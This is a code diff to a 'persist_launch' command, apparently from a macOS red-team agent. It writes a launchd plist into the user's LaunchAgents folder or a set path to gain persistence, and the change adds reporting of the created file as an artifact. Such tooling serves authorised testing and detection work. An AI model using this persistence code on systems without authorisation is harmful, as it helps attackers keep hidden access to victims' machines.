@@ -35,6 +35,7 @@ exports.persist_launch = function(task, command, params){
         template += "</dict>\n</plist>\n"
         // now we need to actually write out the plist to disk
         let response = "";
+        let output = {"user_output":response, "completed": true};
         if(config.hasOwnProperty('LocalAgent') && config['LocalAgent'] === true){
             let path = "~/Library/LaunchAgents/";
             path = $(path).stringByExpandingTildeInPath;
@@ -44,11 +45,15 @@ exports.persist_launch = function(task, command, params){
             }
             path = $(path.js + "/" + label + ".plist");
             response = write_data_to_file(template, path);
+            output["artifacts"] =  [{"base_artifact": "File Create", "artifact": path}];
         }
         else if(config.hasOwnProperty('LaunchPath') && config['LaunchPath'] !== ""){
             response = write_data_to_file(template, $(config['LaunchPath']));
+            output["artifacts"] =  [{"base_artifact": "File Create", "artifact": config["LaunchPath"]}];
         }
-        return {"user_output":response, "completed": true};
+        output["user_output"] = response;
+        return output;
+
     }catch(error){
         return {"user_output":error.toString(), "completed": true, "status": "error"};
     }
